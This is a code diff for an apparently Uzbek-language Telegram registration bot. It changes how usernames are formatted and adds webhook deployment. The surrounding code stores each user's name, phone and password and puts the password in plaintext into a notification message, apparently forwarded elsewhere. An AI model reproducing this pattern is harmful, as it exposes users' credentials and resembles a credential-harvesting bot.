@@ -67,6 +67,9 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     context.user_data["password"] = password
 
     data = context.user_data
+    username = update.message.from_user.username
+    username_text = f"@{username}" if username else "yoq"
+
     msg = (
         "🆕 **Yangi foydalanuvchi ro'yxatdan o'tdi!**\n\n"
         f"👤 Ism: {data['name']}\n"
@@ -74,7 +77,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         f"📱 Telefon: {data['phone']}\n"
         f"🔑 Parol: {data['password']}\n\n"
         f"🆔 User ID: {update.message.from_user.id}\n"
-        f"📧 Username: @{update.message.from_user.username or 'yoq'}"
+        f"📧 Username: {username_text}"
     )
 
     try:
@@ -120,8 +123,19 @@ def main():
 
     app.add_handler(conv)
 
-    logger.info("Bot started!")
-    app.run_polling(drop_pending_updates=True)
+    port = int(os.getenv("PORT", 10000))
+    webhook_base = os.getenv("WEBHOOK_URL", "")
+
+    if webhook_base:
+        webhook_url = f"{webhook_base.rstrip('/')}/{TOKEN}"
+        app.run_webhook(
+            listen="0.0.0.0",
+            port=port,
+            url_path=TOKEN,
+            webhook_url=webhook_url,
+        )
+    else:
+        app.run_polling(drop_pending_updates=True)
 
 
 if __name__ == "__main__":
